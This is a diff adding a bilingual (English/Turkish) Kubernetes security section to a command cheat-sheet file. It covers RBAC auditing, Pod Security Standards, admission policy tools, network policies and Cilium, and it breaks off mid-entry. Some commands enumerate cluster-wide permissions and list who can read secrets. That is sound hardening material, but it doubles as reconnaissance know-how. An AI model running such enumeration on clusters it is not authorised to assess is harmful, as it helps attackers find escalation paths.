@@ -30564,5 +30564,2163 @@ module.exports = [
         ]
       }
     ]
+  },
+  {
+    "id": "k8s-security",
+    "name": "Kubernetes Security",
+    "name_tr": "Kubernetes Güvenliği",
+    "icon": "🔐",
+    "description": "Securing and attacking Kubernetes: RBAC, Pod Security, network policies, admission control, benchmarks, runtime security, and attack paths.",
+    "description_tr": "Kubernetes'i güvenli hale getirme ve saldırma: RBAC, Pod Security, ağ politikaları, admission control, benchmarklar, çalışma zamanı güvenliği ve saldırı yolları.",
+    "subcategories": [
+      {
+        "name": "RBAC (roles, bindings, can-i, audit)",
+        "commands": [
+          {
+            "title": "List Roles and ClusterRoles",
+            "desc": "List all namespaced Roles and cluster-wide ClusterRoles",
+            "desc_tr": "Tüm namespace Role'leri ve cluster geneli ClusterRole'leri listele",
+            "cmd": "kubectl get roles,clusterroles -A -o wide",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "List RoleBindings and ClusterRoleBindings",
+            "desc": "List all bindings to map subjects to roles",
+            "desc_tr": "Tüm binding'leri listeleyerek özneleri (subject) rollere eşle",
+            "cmd": "kubectl get rolebindings,clusterrolebindings -A -o wide",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Inspect a ClusterRole's Rules",
+            "desc": "Show the verbs, resources and apiGroups a ClusterRole grants",
+            "desc_tr": "Bir ClusterRole'ün verdiği verb, resource ve apiGroup kurallarını göster",
+            "cmd": "kubectl describe clusterrole <ROLE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Dump a Role as YAML",
+            "desc": "Get the raw rule definition of a Role for review",
+            "desc_tr": "Bir Role'ün ham kural tanımını inceleme için YAML olarak al",
+            "cmd": "kubectl get role <ROLE> -n <NAMESPACE> -o yaml",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Check a Permission for Yourself",
+            "desc": "Test whether you can perform a verb on a resource",
+            "desc_tr": "Bir resource üzerinde bir verb'i yapıp yapamayacağını test et",
+            "cmd": "kubectl auth can-i create pods -n <NAMESPACE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "List All Your Effective Permissions",
+            "desc": "Enumerate every action allowed for the current identity in a namespace",
+            "desc_tr": "Mevcut kimliğin bir namespace'te izin verilen tüm eylemlerini listele",
+            "cmd": "kubectl auth can-i --list -n <NAMESPACE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Impersonate a User to Test Access",
+            "desc": "Check what a specific user can do via impersonation",
+            "desc_tr": "Impersonation ile belirli bir kullanıcının neler yapabildiğini kontrol et",
+            "cmd": "kubectl auth can-i --list --as=<USER> -n <NAMESPACE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Test a ServiceAccount's Permissions",
+            "desc": "Audit what a workload's ServiceAccount is allowed to do",
+            "desc_tr": "Bir iş yükünün ServiceAccount'unun nelere izinli olduğunu denetle",
+            "cmd": "kubectl auth can-i --list --as=system:serviceaccount:<NAMESPACE>:<SA> -n <NAMESPACE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Check Cluster-Wide Wildcard Access",
+            "desc": "Detect god-mode (all verbs on all resources) for a subject",
+            "desc_tr": "Bir özne için god-mode (tüm resource'larda tüm verb'ler) erişimini tespit et",
+            "cmd": "kubectl auth can-i '*' '*' --all-namespaces --as=<USER>",
+            "tags": [
+              "advanced"
+            ],
+            "note": "A '*'/'*' yes for a non-admin subject is a critical privilege-escalation finding."
+          },
+          {
+            "title": "Check Secret Read Access (Token Theft Risk)",
+            "desc": "Verify if a subject can read Secrets, a common escalation path",
+            "desc_tr": "Bir öznenin Secret okuyup okuyamadığını doğrula; yaygın bir yetki yükseltme yolu",
+            "cmd": "kubectl auth can-i get secrets -n <NAMESPACE> --as=system:serviceaccount:<NAMESPACE>:<SA>",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Find Who Can Perform an Action (kubectl-who-can)",
+            "desc": "Reverse lookup all subjects allowed to do a verb on a resource",
+            "desc_tr": "Bir resource üzerinde bir verb yapabilen tüm özneleri ters arama ile bul",
+            "cmd": "kubectl who-can create pods -n <NAMESPACE>",
+            "tags": [
+              "tool"
+            ],
+            "note": "Install via 'kubectl krew install who-can' (Aqua Security plugin)."
+          },
+          {
+            "title": "Find Who Can Read All Secrets",
+            "desc": "Identify every subject able to read secrets cluster-wide",
+            "desc_tr": "Cluster genelinde secret okuyabilen her özneyi belirle",
+            "cmd": "kubectl who-can get secrets --all-namespaces",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Visualize RBAC for a Subject (rbac-tool)",
+            "desc": "Show all effective permissions for a user or ServiceAccount",
+            "desc_tr": "Bir kullanıcı veya ServiceAccount için tüm efektif izinleri göster",
+            "cmd": "kubectl rbac-tool lookup <SA>",
+            "tags": [
+              "tool"
+            ],
+            "note": "Install with 'kubectl krew install rbac-tool' (insightcloudsec/rbac-tool)."
+          },
+          {
+            "title": "Audit Risky RBAC Permissions (rbac-tool)",
+            "desc": "Analyze the cluster for dangerous permissions and escalation paths",
+            "desc_tr": "Tehlikeli izinler ve yetki yükseltme yolları için cluster'ı analiz et",
+            "cmd": "kubectl rbac-tool analysis",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Generate an RBAC Policy Graph",
+            "desc": "Produce a Graphviz/HTML map of roles, bindings and subjects",
+            "desc_tr": "Rol, binding ve öznelerin Graphviz/HTML haritasını üret",
+            "cmd": "kubectl rbac-tool viz --include-subjects='.*' --outformat dot",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Find Subjects Bound to a ClusterRole",
+            "desc": "List all bindings that reference a given ClusterRole",
+            "desc_tr": "Belirli bir ClusterRole'e atıf yapan tüm binding'leri listele",
+            "cmd": "kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name==\"<ROLE>\") | .metadata.name'",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Detect cluster-admin Bindings",
+            "desc": "Find every subject granted the built-in cluster-admin role",
+            "desc_tr": "Yerleşik cluster-admin rolü verilen her özneyi bul",
+            "cmd": "kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name==\"cluster-admin\") | {binding:.metadata.name, subjects:.subjects}'",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Minimize cluster-admin bindings; prefer least-privilege custom ClusterRoles."
+          },
+          {
+            "title": "List All ServiceAccounts",
+            "desc": "Enumerate ServiceAccounts to map workload identities",
+            "desc_tr": "İş yükü kimliklerini eşlemek için ServiceAccount'ları listele",
+            "cmd": "kubectl get serviceaccounts -A -o wide",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Find Pods Using a ServiceAccount",
+            "desc": "Map which pods run under a given ServiceAccount",
+            "desc_tr": "Hangi pod'ların belirli bir ServiceAccount altında çalıştığını eşle",
+            "cmd": "kubectl get pods -A -o json | jq -r '.items[] | select(.spec.serviceAccountName==\"<SA>\") | .metadata.namespace + \"/\" + .metadata.name'",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Detect Escalate/Bind/Impersonate Verbs",
+            "desc": "Find roles granting the dangerous escalate, bind or impersonate verbs",
+            "desc_tr": "Tehlikeli escalate, bind veya impersonate verb'lerini veren rolleri bul",
+            "cmd": "kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.verbs[]? | test(\"escalate|bind|impersonate\")) | .metadata.name'",
+            "tags": [
+              "advanced"
+            ],
+            "note": "These verbs let a subject grant itself higher privileges; review them carefully."
+          },
+          {
+            "title": "Create a Least-Privilege Role",
+            "desc": "Generate a namespaced Role limited to specific verbs/resources",
+            "desc_tr": "Belirli verb/resource'larla sınırlı bir namespace Role oluştur",
+            "cmd": "kubectl create role <ROLE> --verb=get,list,watch --resource=pods -n <NAMESPACE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Bind a Role to a ServiceAccount",
+            "desc": "Grant a Role to a ServiceAccount via a RoleBinding",
+            "desc_tr": "Bir RoleBinding ile bir Role'ü bir ServiceAccount'a ata",
+            "cmd": "kubectl create rolebinding <BINDING> --role=<ROLE> --serviceaccount=<NAMESPACE>:<SA> -n <NAMESPACE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Dry-Run RBAC Manifest Generation",
+            "desc": "Render a binding as YAML without applying it for GitOps review",
+            "desc_tr": "GitOps incelemesi için bir binding'i uygulamadan YAML olarak üret",
+            "cmd": "kubectl create clusterrolebinding <BINDING> --clusterrole=view --user=<USER> --dry-run=client -o yaml",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Enable API Server Audit Logging",
+            "desc": "Start the kube-apiserver with an audit policy and log path",
+            "desc_tr": "kube-apiserver'ı bir denetim (audit) politikası ve log yolu ile başlat",
+            "cmd": "kube-apiserver --audit-policy-file=<FILE> --audit-log-path=<PATH> --audit-log-maxage=30",
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "note": "Set in the static pod manifest /etc/kubernetes/manifests/kube-apiserver.yaml on control-plane nodes."
+          },
+          {
+            "title": "Query Audit Log for Denied Requests",
+            "desc": "Find authorization denials (403) in the audit log",
+            "desc_tr": "Denetim logunda yetkilendirme reddedilmelerini (403) bul",
+            "cmd": "jq 'select(.responseStatus.code==403)' <PATH>",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Audit Who Accessed Secrets",
+            "desc": "Extract all secret access events with user and verb from the audit log",
+            "desc_tr": "Denetim logundan kullanıcı ve verb ile tüm secret erişim olaylarını çıkar",
+            "cmd": "jq 'select(.objectRef.resource==\"secrets\") | {user:.user.username, verb:.verb, name:.objectRef.name}' <PATH>",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "Audit RBAC with kubescape",
+            "desc": "Scan the cluster against RBAC and least-privilege controls",
+            "desc_tr": "Cluster'ı RBAC ve en az ayrıcalık kontrollerine karşı tara",
+            "cmd": "kubescape scan framework nsa --include-namespaces <NAMESPACE>",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "kubescape maps findings to NSA/MITRE controls including RBAC misconfigurations."
+          }
+        ]
+      },
+      {
+        "name": "Pod Security Standards & Admission",
+        "commands": [
+          {
+            "title": "Enforce Restricted PSS on a Namespace",
+            "desc": "Apply the strictest built-in Pod Security Standard via label",
+            "desc_tr": "En sıkı yerleşik Pod Security Standard'ı etiketle uygular",
+            "cmd": "kubectl label namespace <NAMESPACE> pod-security.kubernetes.io/enforce=restricted --overwrite",
+            "tags": [
+              "essential"
+            ],
+            "note": "Valid enforce levels are privileged, baseline, restricted. Pods violating the level are rejected at admission."
+          },
+          {
+            "title": "Enforce Baseline PSS on a Namespace",
+            "desc": "Block known privilege escalations while allowing common workloads",
+            "desc_tr": "Bilinen ayrıcalık yükseltmelerini engeller ama yaygın iş yüklerine izin verir",
+            "cmd": "kubectl label namespace <NAMESPACE> pod-security.kubernetes.io/enforce=baseline --overwrite",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Pin the PSS Version on a Namespace",
+            "desc": "Lock enforcement to a specific Kubernetes API version",
+            "desc_tr": "Zorlamayı belirli bir Kubernetes API sürümüne sabitler",
+            "cmd": "kubectl label namespace <NAMESPACE> pod-security.kubernetes.io/enforce-version=v1.30 --overwrite",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Omit or set to 'latest' to always track the cluster's current policy definitions."
+          },
+          {
+            "title": "Set Warn and Audit Modes Together",
+            "desc": "Add non-blocking warning and audit-log feedback for a level",
+            "desc_tr": "Bir seviye için engellemeyen uyarı ve audit-log geri bildirimi ekler",
+            "cmds": [
+              "kubectl label namespace <NAMESPACE> pod-security.kubernetes.io/warn=restricted --overwrite",
+              "kubectl label namespace <NAMESPACE> pod-security.kubernetes.io/audit=restricted --overwrite"
+            ],
+            "tags": [
+              "essential"
+            ],
+            "note": "warn surfaces a client-side message; audit writes an annotation to the API audit log. Neither blocks the pod."
+          },
+          {
+            "title": "Dry-Run: Audit Existing Workloads Before Enforcing",
+            "desc": "Apply only warn/audit to discover violations without breaking pods",
+            "desc_tr": "Pod'ları bozmadan ihlalleri keşfetmek için yalnızca warn/audit uygular",
+            "cmd": "kubectl label namespace <NAMESPACE> pod-security.kubernetes.io/warn=restricted pod-security.kubernetes.io/audit=restricted --overwrite",
+            "tags": [
+              "essential"
+            ],
+            "note": "Always run this staging step before flipping enforce=restricted on a populated namespace."
+          },
+          {
+            "title": "Label All Namespaces with a Warn Level",
+            "desc": "Bulk-apply a warning level across every namespace",
+            "desc_tr": "Her namespace'e toplu olarak bir uyarı seviyesi uygular",
+            "cmd": "kubectl label --all namespaces pod-security.kubernetes.io/warn=baseline --overwrite",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "List PSS Labels on All Namespaces",
+            "desc": "View the enforce/warn/audit level set on each namespace",
+            "desc_tr": "Her namespace'e atanmış enforce/warn/audit seviyesini gösterir",
+            "cmd": "kubectl get namespaces -L pod-security.kubernetes.io/enforce -L pod-security.kubernetes.io/warn -L pod-security.kubernetes.io/audit",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Inspect PSA Labels via JSONPath",
+            "desc": "Extract just the PSA-related labels for one namespace",
+            "desc_tr": "Tek bir namespace için yalnızca PSA etiketlerini çıkarır",
+            "cmd": "kubectl get namespace <NAMESPACE> -o jsonpath='{.metadata.labels}' | tr ',' '\\n' | grep pod-security",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Remove a PSS Enforce Label",
+            "desc": "Drop enforcement back to the default (privileged) for a namespace",
+            "desc_tr": "Bir namespace için zorlamayı varsayılana (privileged) geri düşürür",
+            "cmd": "kubectl label namespace <NAMESPACE> pod-security.kubernetes.io/enforce-",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Test a Pod Against a Level with Server Dry-Run",
+            "desc": "Validate a manifest against PSA without creating the pod",
+            "desc_tr": "Pod oluşturmadan bir manifesti PSA'ya karşı doğrular",
+            "cmd": "kubectl apply -f <FILE> --dry-run=server -n <NAMESPACE>",
+            "tags": [
+              "essential"
+            ],
+            "note": "Server-side dry-run runs the admission webhook chain, so PSA warnings/rejections appear without persisting the object."
+          },
+          {
+            "title": "Reproduce a Violation with a Privileged Pod",
+            "desc": "Confirm enforcement by attempting to run a privileged container",
+            "desc_tr": "Privileged konteyner çalıştırmayı deneyerek zorlamayı doğrular",
+            "cmd": "kubectl run psa-test --image=<IMAGE> --privileged -n <NAMESPACE> --dry-run=server",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Against an enforce=baseline/restricted namespace this is rejected with a 'violates PodSecurity' message."
+          },
+          {
+            "title": "View PSA Audit Violations in API Audit Log",
+            "desc": "Grep the kube-apiserver audit log for PSA audit annotations",
+            "desc_tr": "kube-apiserver audit log'unda PSA audit açıklamalarını arar",
+            "cmd": "grep 'pod-security.kubernetes.io/audit-violations' /var/log/kubernetes/audit/audit.log",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Audit mode records violations as the annotation key audit-violations on the audit event."
+          },
+          {
+            "title": "Restricted-Compliant securityContext Patch",
+            "desc": "Patch a deployment with pod-level fields the restricted profile requires",
+            "desc_tr": "restricted profilinin gerektirdiği pod-seviyesi alanlarla deployment'ı yamalar",
+            "cmd": "kubectl patch deployment <POD> -n <NAMESPACE> --type merge -p '{\"spec\":{\"template\":{\"spec\":{\"securityContext\":{\"runAsNonRoot\":true,\"seccompProfile\":{\"type\":\"RuntimeDefault\"}}}}}}'",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Restricted also requires allowPrivilegeEscalation=false and capabilities drop ALL at the container level."
+          },
+          {
+            "title": "Drop ALL Capabilities for Restricted Compliance",
+            "desc": "Patch a container to drop every Linux capability",
+            "desc_tr": "Bir konteyneri tüm Linux yeteneklerini düşürmek için yamalar",
+            "cmd": "kubectl patch deployment <POD> -n <NAMESPACE> --type json -p '[{\"op\":\"add\",\"path\":\"/spec/template/spec/containers/0/securityContext\",\"value\":{\"allowPrivilegeEscalation\":false,\"capabilities\":{\"drop\":[\"ALL\"]}}}]'",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Check PodSecurity Admission Plugin Is Enabled",
+            "desc": "Confirm the PodSecurity admission plugin is active on the apiserver",
+            "desc_tr": "apiserver üzerinde PodSecurity admission eklentisinin aktif olduğunu doğrular",
+            "cmd": "kubectl -n kube-system get pod -l component=kube-apiserver -o yaml | grep -- '--enable-admission-plugins'",
+            "tags": [
+              "advanced"
+            ],
+            "note": "PodSecurity is enabled by default since v1.23 and went GA in v1.25; look for it in the plugin list."
+          },
+          {
+            "title": "Inspect the Cluster-Wide AdmissionConfiguration",
+            "desc": "Read the file that sets cluster default PSS levels and exemptions",
+            "desc_tr": "Küme varsayılan PSS seviyelerini ve muafiyetlerini belirleyen dosyayı okur",
+            "cmd": "sudo cat /etc/kubernetes/admission/pod-security.yaml",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Referenced via --admission-control-config-file; its defaults apply to namespaces without explicit PSA labels."
+          },
+          {
+            "title": "Explore PodSecurityConfiguration Exemptions",
+            "desc": "Show the exemptions schema used to bypass PSA for specific subjects",
+            "desc_tr": "Belirli özneler için PSA'yı atlamada kullanılan exemptions şemasını gösterir",
+            "cmd": "kubectl explain --api-version=pod-security.admission.config.k8s.io/v1 PodSecurityConfiguration.exemptions",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Exemptions support usernames, runtimeClasses and namespaces; use sparingly as they fully bypass PSA."
+          },
+          {
+            "title": "Find Pods Not Running as Non-Root",
+            "desc": "List pods whose securityContext does not enforce runAsNonRoot",
+            "desc_tr": "securityContext'i runAsNonRoot zorlamayan pod'ları listeler",
+            "cmd": "kubectl get pods -n <NAMESPACE> -o jsonpath='{range .items[*]}{.metadata.name}{\"\\t\"}{.spec.securityContext.runAsNonRoot}{\"\\n\"}{end}'",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Find Privileged Containers Cluster-Wide",
+            "desc": "Detect any container with privileged=true across all namespaces",
+            "desc_tr": "Tüm namespace'lerde privileged=true olan konteynerleri tespit eder",
+            "cmd": "kubectl get pods -A -o jsonpath='{range .items[*]}{range .spec.containers[*]}{.securityContext.privileged}{\"\\t\"}{end}{.metadata.namespace}/{.metadata.name}{\"\\n\"}{end}' | grep true",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Find Pods Using hostNetwork",
+            "desc": "List pods that share the host's network namespace",
+            "desc_tr": "Host'un network namespace'ini paylaşan pod'ları listeler",
+            "cmd": "kubectl get pods -A -o jsonpath='{range .items[?(@.spec.hostNetwork==true)]}{.metadata.namespace}/{.metadata.name}{\"\\n\"}{end}'",
+            "tags": [
+              "advanced"
+            ],
+            "note": "hostNetwork, hostPID and hostIPC are all forbidden by the baseline profile."
+          },
+          {
+            "title": "Audit Cluster with Polaris",
+            "desc": "Run Polaris to score workloads against security best practices",
+            "desc_tr": "İş yüklerini güvenlik en iyi pratiklerine göre puanlamak için Polaris çalıştırır",
+            "cmd": "polaris audit --audit-path <PATH> --format pretty",
+            "tags": [
+              "tool"
+            ],
+            "note": "Polaris also runs as an in-cluster validating webhook to block non-conformant pods."
+          },
+          {
+            "title": "Scan Manifests with kube-score",
+            "desc": "Statically lint pod manifests for security and reliability issues",
+            "desc_tr": "Pod manifestlerini güvenlik ve güvenilirlik sorunları için statik denetler",
+            "cmd": "kube-score score <FILE>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Validate Resources with kubeconform",
+            "desc": "Check manifests against the Kubernetes schema offline",
+            "desc_tr": "Manifestleri çevrimdışı olarak Kubernetes şemasına karşı doğrular",
+            "cmd": "kubeconform -strict -summary <FILE>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Enforce Policy with Kyverno (Disallow Privileged)",
+            "desc": "Apply a Kyverno ClusterPolicy that mirrors PSS restricted rules",
+            "desc_tr": "PSS restricted kurallarını yansıtan bir Kyverno ClusterPolicy uygular",
+            "cmd": "kubectl apply -f https://raw.githubusercontent.com/kyverno/policies/main/pod-security/restricted/disallow-privileged-containers/disallow-privileged-containers.yaml",
+            "tags": [
+              "tool"
+            ],
+            "note": "Kyverno's pod-security subset lets you enforce individual restricted controls with per-rule exclusions PSA cannot express."
+          },
+          {
+            "title": "Apply an OPA Gatekeeper Constraint Template",
+            "desc": "Install a Gatekeeper template that blocks privileged containers",
+            "desc_tr": "Privileged konteynerleri engelleyen bir Gatekeeper şablonu kurar",
+            "cmd": "kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper-library/master/library/pod-security-policy/privileged-containers/template.yaml",
+            "tags": [
+              "tool"
+            ],
+            "note": "Gatekeeper uses Rego; pair each ConstraintTemplate with a Constraint that scopes it to namespaces/kinds."
+          },
+          {
+            "title": "Dry-Run Test a Pod Against Kyverno Policies",
+            "desc": "Evaluate a manifest against policies offline with the Kyverno CLI",
+            "desc_tr": "Bir manifesti Kyverno CLI ile çevrimdışı olarak politikalara karşı değerlendirir",
+            "cmd": "kyverno apply <PATH> --resource <FILE>",
+            "tags": [
+              "tool"
+            ],
+            "note": "Great for CI pipelines: returns a non-zero exit code when a resource violates an enforce-mode policy."
+          },
+          {
+            "title": "Trace Why a Pod Was Rejected by PSA",
+            "desc": "Read namespace events to see the PodSecurity rejection reason",
+            "desc_tr": "PodSecurity ret nedenini görmek için namespace olaylarını okur",
+            "cmd": "kubectl get events -n <NAMESPACE> --field-selector reason=FailedCreate -o wide",
+            "tags": [
+              "essential"
+            ],
+            "note": "When a Deployment's pods are blocked by PSA, the failure shows on the ReplicaSet events, not on a Pod object."
+          }
+        ]
+      },
+      {
+        "name": "Network Policies & Cilium",
+        "commands": [
+          {
+            "title": "List All Network Policies",
+            "desc": "List native Kubernetes NetworkPolicies in a namespace",
+            "desc_tr": "Bir namespace icindeki yerel Kubernetes NetworkPolicy nesnelerini listele",
+            "cmd": "kubectl get networkpolicy -n <NAMESPACE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "List Network Policies Cluster-Wide",
+            "desc": "Show NetworkPolicies across all namespaces",
+            "desc_tr": "Tum namespace'lerdeki NetworkPolicy nesnelerini goster",
+            "cmd": "kubectl get netpol --all-namespaces -o wide",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Describe a Network Policy",
+            "desc": "Inspect ingress/egress rules and pod selectors of a policy",
+            "desc_tr": "Bir policy'nin ingress/egress kurallarini ve pod selector'larini incele",
+            "cmd": "kubectl describe networkpolicy <NAME> -n <NAMESPACE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Default Deny All Ingress",
+            "desc": "Apply a policy that blocks all incoming traffic to pods in a namespace",
+            "desc_tr": "Bir namespace'teki pod'lara gelen tum trafigi engelleyen policy uygula",
+            "cmd": "kubectl apply -f - <<'EOF'\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-ingress\n  namespace: <NAMESPACE>\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\nEOF",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Default Deny All Egress",
+            "desc": "Block all outbound traffic from every pod in a namespace",
+            "desc_tr": "Namespace'teki her pod'dan giden tum trafigi engelle",
+            "cmd": "kubectl apply -f - <<'EOF'\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-egress\n  namespace: <NAMESPACE>\nspec:\n  podSelector: {}\n  policyTypes:\n  - Egress\nEOF",
+            "tags": [
+              "essential",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Allow Ingress From a Specific Label",
+            "desc": "Permit traffic only from pods carrying a given label",
+            "desc_tr": "Yalnizca belirli bir etikete sahip pod'lardan gelen trafige izin ver",
+            "cmd": "kubectl apply -f - <<'EOF'\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-from-app\n  namespace: <NAMESPACE>\nspec:\n  podSelector:\n    matchLabels:\n      app: <POD>\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          role: frontend\n  policyTypes:\n  - Ingress\nEOF",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Test Connectivity Between Pods",
+            "desc": "Verify whether a NetworkPolicy blocks or allows pod-to-pod traffic",
+            "desc_tr": "Bir NetworkPolicy'nin pod'lar arasi trafigi engelleyip engellemedigini dogrula",
+            "cmd": "kubectl exec -n <NAMESPACE> <POD> -- curl -sS --max-time 5 http://<TARGET_IP>:<PORT>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Quick Netpol Test Pod",
+            "desc": "Spin up an ephemeral client pod to probe network reachability",
+            "desc_tr": "Ag erisilebilirligini test etmek icin gecici bir istemci pod'u baslat",
+            "cmd": "kubectl run nettest --rm -it --image=nicolaka/netshoot -n <NAMESPACE> -- /bin/bash",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Install Cilium CLI",
+            "desc": "Download and install the Cilium command-line tool",
+            "desc_tr": "Cilium komut satiri aracini indir ve kur",
+            "cmds": [
+              "CILIUM_CLI_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/cilium-cli/main/stable.txt)",
+              "curl -L --fail -o cilium.tar.gz https://github.com/cilium/cilium-cli/releases/download/${CILIUM_CLI_VERSION}/cilium-linux-amd64.tar.gz",
+              "sudo tar xzvfC cilium.tar.gz /usr/local/bin"
+            ],
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Install Cilium into Cluster",
+            "desc": "Deploy the Cilium CNI into the current Kubernetes cluster",
+            "desc_tr": "Cilium CNI'yi mevcut Kubernetes kumesine kur",
+            "cmd": "cilium install --version <VERSION>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Check Cilium Status",
+            "desc": "Show the health and deployment status of Cilium components",
+            "desc_tr": "Cilium bilesenlerinin saglik ve dagitim durumunu goster",
+            "cmd": "cilium status --wait",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Run Cilium Connectivity Test",
+            "desc": "Execute the built-in end-to-end connectivity and policy test suite",
+            "desc_tr": "Yerlesik uctan uca baglanti ve policy test paketini calistir",
+            "cmd": "cilium connectivity test --namespace <NAMESPACE>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "List Cilium Endpoints",
+            "desc": "Show Cilium-managed endpoints with their security identities and policy state",
+            "desc_tr": "Cilium yonetimindeki endpoint'leri guvenlik kimlikleri ve policy durumuyla listele",
+            "cmd": "kubectl -n kube-system exec ds/cilium -- cilium endpoint list",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "List CiliumNetworkPolicies",
+            "desc": "List L3/L4/L7 CiliumNetworkPolicy resources in a namespace",
+            "desc_tr": "Bir namespace'teki L3/L4/L7 CiliumNetworkPolicy kaynaklarini listele",
+            "cmd": "kubectl get cnp -n <NAMESPACE> -o wide",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "List Cluster-Wide Cilium Policies",
+            "desc": "List CiliumClusterwideNetworkPolicy objects affecting the whole cluster",
+            "desc_tr": "Tum kumeyi etkileyen CiliumClusterwideNetworkPolicy nesnelerini listele",
+            "cmd": "kubectl get ccnp -o wide",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Cilium L7 HTTP Policy",
+            "desc": "Restrict traffic to specific HTTP methods and paths (Layer 7)",
+            "desc_tr": "Trafigi belirli HTTP metot ve yollariyla sinirla (Katman 7)",
+            "cmd": "kubectl apply -f - <<'EOF'\napiVersion: cilium.io/v2\nkind: CiliumNetworkPolicy\nmetadata:\n  name: l7-http-rule\n  namespace: <NAMESPACE>\nspec:\n  endpointSelector:\n    matchLabels:\n      app: <POD>\n  ingress:\n  - toPorts:\n    - ports:\n      - port: \"80\"\n        protocol: TCP\n      rules:\n        http:\n        - method: \"GET\"\n          path: \"/api/.*\"\nEOF",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Cilium DNS-Aware Egress Policy",
+            "desc": "Allow egress only to a specific FQDN using Cilium DNS-based rules",
+            "desc_tr": "Cilium DNS tabanli kurallarla yalnizca belirli bir FQDN'e cikis trafigine izin ver",
+            "cmd": "kubectl apply -f - <<'EOF'\napiVersion: cilium.io/v2\nkind: CiliumNetworkPolicy\nmetadata:\n  name: fqdn-egress\n  namespace: <NAMESPACE>\nspec:\n  endpointSelector:\n    matchLabels:\n      app: <POD>\n  egress:\n  - toFQDNs:\n    - matchName: \"<DOMAIN>\"\n  - toEndpoints:\n    - matchLabels:\n        k8s:io.kubernetes.pod.namespace: kube-system\n        k8s-app: kube-dns\n    toPorts:\n    - ports:\n      - port: \"53\"\n        protocol: ANY\n      rules:\n        dns:\n        - matchPattern: \"*\"\nEOF",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "DNS egress kurallari calismasi icin kube-dns/CoreDNS'e UDP/TCP 53 erisimine ve dns rules ile DNS proxy'ye izin verilmesi zorunludur."
+          },
+          {
+            "title": "Monitor Live Network Flows",
+            "desc": "Stream real-time dropped packet/flow events processed by Cilium",
+            "desc_tr": "Cilium tarafindan islenen gercek zamanli dusurulen paket/akis olaylarini canli izle",
+            "cmd": "kubectl -n kube-system exec ds/cilium -- cilium monitor -t drop",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Observe Flows with Hubble",
